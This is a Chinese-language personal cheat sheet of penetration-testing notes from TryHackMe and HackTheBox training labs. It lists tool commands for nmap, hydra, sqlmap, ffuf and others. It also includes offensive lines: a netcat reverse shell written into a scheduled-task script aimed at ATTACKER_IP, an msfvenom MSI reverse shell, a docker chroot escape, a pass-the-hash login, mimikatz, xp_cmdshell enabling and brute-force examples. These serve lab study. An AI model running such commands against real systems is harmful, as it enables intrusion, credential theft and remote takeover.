# NOTE-tryhackme- [NOTE-tryhackme](#note-tryhackme)
- [NOTE-tryhackme- NOTE-tryhackme](#note-tryhackme--note-tryhackme)
  - [WEB](#web)
  - [提权](#提权)
    - [反shell](#反shell)
    - [稳定shell](#稳定shell)
    - [powershell-Windows](#powershell-windows)
    - [Scheduled Tasks-Windows](#scheduled-tasks-windows)
    - [AlwaysInstallElevated](#alwaysinstallelevated)
    - [一些少见的提权方式](#一些少见的提权方式)
  - [工具使用](#工具使用)
    - [evil-winrm](#evil-winrm)
    - [impacket](#impacket)
    - [john the ripper](#john-the-ripper)
    - [remmina](#remmina)
    - [Nmap](#nmap)
    - [wireshark](#wireshark)
    - [hydra](#hydra)
    - [hashcat](#hashcat)
    - [burpsuit](#burpsuit)
    - [gobuster](#gobuster)
    - [sqlmap](#sqlmap)
    - [ffuf](#ffuf)
    - [steghide](#steghide)
    - [stegseek](#stegseek)
    - [snort](#snort)
    - [powershell](#powershell)
    - [xfreerdp](#xfreerdp)
    - [objdump](#objdump)
    - [radare2](#radare2)
  - [一些重要的命令](#一些重要的命令)
    - [curl命令](#curl命令)
    - [download](#download)
    - [mimikatz](#mimikatz)
    - [sc](#sc)
    - [copy](#copy)
    - [find](#find)
    - [ssh](#ssh)
    - [cat](#cat)
    - [ftp](#ftp)
    - [samba共享](#samba共享)
    - [mysql](#mysql)
    - [mssql](#mssql)
    - [redis](#redis)
    - [zip](#zip)
    - [other](#other)
  - [一些要记住的知识](#一些要记住的知识)
    - [弱密码](#弱密码)
    - [CMS](#cms)
    - [手测](#手测)
    - [vHosts](#vhosts)
    - [编码生成命令](#编码生成命令)
    - [读取文件的命令](#读取文件的命令)
    - [血的教训](#血的教训)
## WEB


搭建一个临时的服务器
python -m http.server PORT



## 提权 

### 反shell

### 稳定shell



### powershell-Windows
- Windows用type命令读取文件内容(cat)  
- Windows用dir命令列出该文件夹下的所有文件(ls)  
- 

``````
powershell历史
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
注意：上面的命令只能在 cmd.exe 中运行，因为 Powershell 不会将其识别%userprofile%为环境变量。要从 Powershell 读取该文件，您必须替换%userprofile%为$Env:userprofile. 
``````
``````
这是在文件上查找数据库连接字符串的快速方法：
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
``````
### Scheduled Tasks-Windows
``````
可以使用不带任何选项的命令从命令行列出计划任务 schtasks
schtasks /query /tn vulntask /fo list /v  

要检查可执行文件的文件权限，我们使用icacls
icacls c:\tasks\schtask.bat
``````
更改bat生成反向shell
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat  

### AlwaysInstallElevated

注意： AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。  
此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。  
``````
命令提示符
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
``````
为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。  

使用msfvenom生成恶意.msi文件：  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.4.63 LPORT=LOCAL_PORT -f msi -o malicious.msi  

由于这是一个反向 shell，您还应该运行相应配置的Metasploit处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：    
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

### 一些少见的提权方式

>docker提权

使用命令：     
docker images
输出的文件与GTFObins的命令配合使用

docker run -v /:/mnt --rm -it <FILES> chroot /mnt sh



## 工具使用

### evil-winrm

windows登录工具：  
evil-winrm -i IP -u USERNAME -p PASSWORD

evil-winrm -i 10.200.60.201 -u trevor.local -H 41cb324dee3768a2777a1d640b2808a8

### impacket

HTB起点靶机发现的，专门用来对付mssql(微软的数据库)





### john the ripper

john [选项] [文件]  

unshadow passwd.txt shadow.txt 

>john自带的工具  

>gpg2john

``````
gpg2john tryhackme.asc > keyhash
john --wordlist= keyhash [解出pgp加密的密码]
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
``````

>zip2john

```
zip2john
```

**ssh2john**:

如果输出不规范，可以打开源码复制源码内容，源码比较规范

``````
ss2john <ssh私钥文件> > hash.txt
``````


### remmina
可以远程登录并控制Windows账户  
输入靶机IP  
然后用已有的账户密码登录  

### Nmap
``````
sudo nmap IP -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace 

sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48（测试过真正能用的）
以上语法中的“-sSU”选项表示进行UDP和TCP SYN扫描  

``````
>实例

以[NUMBER]的速率扫描
--min-rate [NUMBER]


通常，'-sV' 与 Nmap 一起使用来确定版本，但这并不总是足够的。在这种情况下，请尝试添加“-sC”来运行安全脚本，这是获取版本等内容的另一种好方法。


>规避防火墙
```
sudo nmap -sSU -p 53 --script dns-nsid 10.129.2.48

sudo nmap -Pn --min-rate 10000 --source-port 53  -sV 10.129.67.88 -n --disable-arp-ping
```


### wireshark

左转去流量分析.md查看

### hydra

>HTBA关于hydra的栗子：  
``````
默认密码[用户名和密码一样]：

hydra -C wordlist.txt SERVER_IP -s PORT http-get /
实例：
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.56.248 -s 43434 http-get /
通过密码匹配用户名：
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p admin -u -f 94.237.56.248 -s 43434 http-get /

基本身份验证暴力破解 - 用户/密码词表
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /	

登录表单暴力破解 - 静态用户，通过字表
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"	

SSH 蛮力 - 用户/通行证词表
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4	

FTP 蛮力 - 静态用户，传递字表
hydra -l m.gates -P rockyou.txt ftp://127.0.0.1	


``````
>列出hydra支持的服务
``````
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
``````
用于最基础的HTTP身份验证：  
http[s]-{head|get|post}  
用于登录表单：  
http[s]-post-form  (post和get不能乱用,不然会出问题)

>实例

hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.234.67 -s 80 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"

hydra在做网页登陆时，引号里的成分"/PATH:user&pass:错误的回复"
``````
POST /j_acegi_security_check HTTP/1.1
Host: 10.10.228.252:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://10.10.228.252:8080
Connection: close
Referer: http://10.10.228.252:8080/login?from=%2F
Cookie: JSESSIONID.22fcccde=node01581dbtfy5zgpdqpoltmbmxau30.node0
=
Upgrade-Insecure-Requests: 1

j_username=brute&j_password=brute&from=%2F&Submit=Sign+in
``````
POST/GET后和HTTP/1.1之间是路径，user&pass(不用from和Submit),错误的回复要在页面上找

### hashcat
识别hash类型：  
hashcat -h HASH_FILE


hashcat -m <哈希类型数字> -a <攻击模式数字> HASH_FILE WORDLISTS.txt --fonts

-a 0 :字典破解模式
-m 0 ：hash类型为md5



### burpsuit

当需要将修改后的页面呈现到浏览器上时：  
proxy-intercept页面->forward(此时浏览器在代理状态下)  
forward后,解除代理状态,重新加载。  

### gobuster

默认：  
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

--no-error

>字典
``````
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

``````
>参数

-a 修改user-agent

-X 

### sqlmap

sqlmap -u "URL"

|命令	|描述|
|:--:|:--:|
|sqlmap -h |	查看基本帮助菜单|
|sqlmap -hh	|查看高级帮助菜单
|sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	|在不询问用户输入的情况下运行SQLMap|
|sqlmap 'http://www.example.com/' --data 'uid=1&name=test'	|SQLMap使用 POST 请求|
|sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'	|指定带有星号的注入点的 POST 请求|
|sqlmap -r req.txt	|将 HTTP 请求文件传递给SQLMap|
|sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'	|指定 Cookie 标头|
|sqlmap -u www.target.com --data='id=1' --method PUT	|指定 PUT 请求|
|sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	|将流量存储到输出文件|
|sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch	|指定详细级别|
|sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"	|指定前缀或后缀|
|sqlmap -u www.example.com/?id=1 -v 3 --level=5	|指定级别和风险|
|sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	|基本数据库枚举|
|sqlmap -u "http://www.example.com/?id=1" --tables -D testdb	|表枚举|
|sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname	|表/行枚举|
|sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"	|条件枚举|
|sqlmap -u "http://www.example.com/?id=1" --schema	|数据库架构枚举|
|sqlmap -u "http://www.example.com/?id=1" --search -T user	|搜索数据|
|sqlmap -u "http://www.example.com/?id=1" --passwords --batch	|密码枚举和破解|
|sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	|反CSRF令牌绕过|
|sqlmap --list-tampers	|列出所有篡改脚本|
|sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	|检查 DBA 权限|
|sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	|读取本地文件|
|sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	|写入文件|
|sqlmap -u "http://www.example.com/?id=1" --os-shell	|生成操作系统 shell|


>其他参数

参数|用法
|-|-|
--user-agent="" | 设置用户代理
--batch |省略输入Y的步骤
--cookie="" |设置cookie
-p "" | 指定测试的参数
-D "" | 指定数据库
-T "" | 指定表
-C "" | 指定列
--dbs | 爆破数据库名
--tables | 爆破表名
--columns | 爆破列名
--dump | 读取指定键的值

### ffuf

>目录模糊测试

ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ

您也可以使用任何自定义关键字来代替FUZZ，您只需要像这样定义它 wordlist.txt:KEYWORD。

ffuf -u http://MACHINE_IP/NORAJ -w /usr/share/seclists/Discovery/Web-Content/big.txt:NORAJ

>页面模糊测试

扩展名模糊测试

 ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ

页面模糊测试

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php


>递归模糊测试

递归模糊测试：  

ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v


>子域模糊测试

>vhost模糊

>参数模糊

GET:  


POST:  

>值模糊


>参数

-e 扩展名  
可以指定多个扩展名

-fc <状态码> 


### steghide

分析图片信息：  
steghide --info FILE

分离文件：  
steghide --extract -sf FILE

### stegseek
暴力破解文件的密码：

stegseek -sf FILE WORDLISTS

### snort

查看版本：  
snort -V 

配置文件：  
sudo snort -c FILEPATH -T

>嗅探模式参数：  

-v 详细模式
-i 接口
-d 转储数据包模式
-e 链路层数据包抓取
-X 完全数据包转储

>数据包记录器模式

-l	记录器模式、目标日志和警报输出目录。默认输出文件夹是/var/log/snort，默认操作是在/var/log/snort中转储为 tcpdump 格式
-K ASCII	以 ASCII 格式记录数据包。
-r	读取选项，读取Snort中转储的日志。
-n	指定将处理/读取的数据包数量。 Snort 在读取指定数量的数据包后将停止。

剩下的左转去流量分析查看

### powershell

在powershell上从网站上下载文件：  
Invoke-WebRequest -Uri https://example.com/path/to/file.txt -OutFile C:\path\to\output\file.txt 

如果不是powershell则要在前面加上powershell -c

### xfreerdp

xfreerdp /v:<IP> /u:<USRENAME> /p:<PASSWORD>

通过添加来解决：/tls-seclevel:0 /timeout:80000
### objdump

objdump -D FILE


### radare2

r2 ./FILE -A [加载并分析文件]

aaa 分析文件

iI 文件的基本信息

ii

iE

it

afl




## 一些重要的命令

### curl命令

Linux,macOS,windows powershell
CURL（CommandLine Uniform Resource Locator），是一个利用 URL 语法，在命令行终端下使用的网络请求工具，支持 HTTP、HTTPS、FTP 等协议。CURL 也有用于程序开发使用的版本 libcurl。  
``````
curl URL
curl -O /path/file [下载文件]
curl -h	cURL 帮助菜单
curl inlanefreight.com	基本 GET 请求
curl -s -O inlanefreight.com/index.html	下载文件
curl -k https://inlanefreight.com	跳过 HTTPS （SSL） 证书验证
curl inlanefreight.com -v	打印完整的 HTTP 请求/响应详细信息
curl -I https://www.inlanefreight.com	发送 HEAD 请求（仅打印响应标头）
curl -i https://www.inlanefreight.com	打印响应标题和响应正文
curl https://www.inlanefreight.com -A 'Mozilla/5.0'	设置 User-Agent 标头
curl -u admin:admin http://<SERVER_IP>:<PORT>/	设置 HTTP 基本授权凭据
curl http://admin:admin@<SERVER_IP>:<PORT>/	在 URL 中传递 HTTP 基本授权凭据
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/	设置请求标头
curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'	传递 GET 参数
curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/	发送带有 POST 数据的 POST 请求
curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/	设置请求 Cookie
curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php	发送包含 JSON 数据的 POST 请求
curl http://<SERVER_IP>:<PORT>/api.php/city/london	阅读条目
curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq	阅读所有条目
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'	创建（添加）条目
curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'	更新（修改）条目
curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City	删除条目
``````
>参数

-X 选取请求方式[POST PUT GET]

### download

linux:
```
wget http://IP:PORT/FILES
```

windows:
```
Invoke-WebRequest -Uri "http://IP:PORT/FILES" -OutFile "C:\FILES"
```

### mimikatz

mimikatz使用需要提权到administrator。

命令| 描述
|-|-| 
privilege::debug |
sekurlsa::wdigest |
sekurlsa::USERNAEM |



### sc
windows  
``````
sc start 服务 （启动服务） 
sc stop 服务  （停止服务）
``````
### copy
windows  
``````
copy 文件 “路径”
将文件放到路径下
``````
### find

find [目录路径] -type f -name [文件名]

find [目录路径] -type d -name [文件名]

find [目录路径] -type f -size [大小]

find [目录路径] -type f -user [用户名]	

find [目录路径] -type f -group [组名称]

find [目录路径] -type f -newermt '[日期和时间]'

find [目录路径] -type f -newermt [开始日期范围] ! -newermt [结束日期范围]

find [目录路径] -type f -newerat [开始日期范围] ! -newerat [结束日期范围]

grep -iRl [目录路径/关键字]

man find

查找suid:
``````
find / -perm -u=s -type f 2>/dev/null
``````

### ssh

ssh usr@IP

用私钥登录ssh    
chmod 600 id_rsa  
ssh -i id_rsa usr@IP

### cat
显示文件内容的行数
cat FILENAME -n

### ftp

ftp IP  (用ftp连接某IP,需要输入name和passwd)

匿名访问ftp:  
ftp IP  
用户名：anonymous  
密码：空  

### samba共享
枚举samba共享：  
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP

smbclient //MACHINE_IP/anonymous

smbget -R smb://MACHINE_IP/anonymous

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP

可以列出共享：  
smbclient -N -L //MACHINE_IP/



### mysql

登录命令：  
mysql -u root -p

远程登陆实例：  
mysql -u root -h docker.hackthebox.eu -P 3306 -p 

### mssql

在start point机器上发现的

开启xp_cmdshell

exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;


### redis

redis-cli -h HOST -p PORT -p PASSWD

get <KEY> 输出key的值

keys * 输出所有的key

### zip

>zip

压缩：  
zip -r test.zip file

解压：  
unzip test.zip

>rar

压缩：  
rar a -r test.rar file

解压：
unrar x test.rar

### other

>string

可以输出非文本文件里的字符：  
strings FILE

>

## 一些要记住的知识



### 弱密码

在网页端登陆时可以尝试username:password,admin:admin,admin:password等等默认密码组合。

### CMS

常用的CMS应该都有scan软件，比如joomla有joomscan，wordpress有wpscan

>wpscan

针对博客管理工具wordpress:  
枚举：  
wpscan --url http://IP/ -e


### 手测

一些目录：robots.txt,README.txt,index.php,login.php

### vHosts

echo “10.10.10.10 exfiltrate.htb exploitserver.htb xss.vulnerablesite.htb csrf.vulnerablesite.htb” >> /etc/hosts

### 编码生成命令

>base64



>MD5

md5sum FILE

>sha256

sha256sum FILE

### 读取文件的命令

>输出到屏幕上

- less
- cat
- tail
- head
- sort

>编辑器

- vim
- emacs
- nano
- 




>其他小工具

rev：反转字符串

od：输出文件的各种进制的ascii码

hd:hexdump命令的缩写，输出文件的ascii码和内容

xxd:给指定文件做一次16进制输出

base32：对字符串或文件做base32加密并输出  
base32 -d 可以解码base32

base64：对字符串或文件做base64加密并输出  
base64 -d 可以解码base64

split：对文件进行拆分，可以拆成很多文件

gzip:压缩和解压缩的工具，zcat命令可以读取压缩文件的内容







### 血的教训

- Linux的文件系统一定要非常了解，以便于识别出在根目录的其他文件夹
- unkown的端口再扫一遍
- ip地址的Defanged Version(去义版本)就是在.的左右加上中括号。ep：10.1.12.2的去义版本就是12[.]1[.]12[.]2
- 妈的，还他妈可以用外面的漏洞提里面的权(任意文件读取漏洞提权)
- 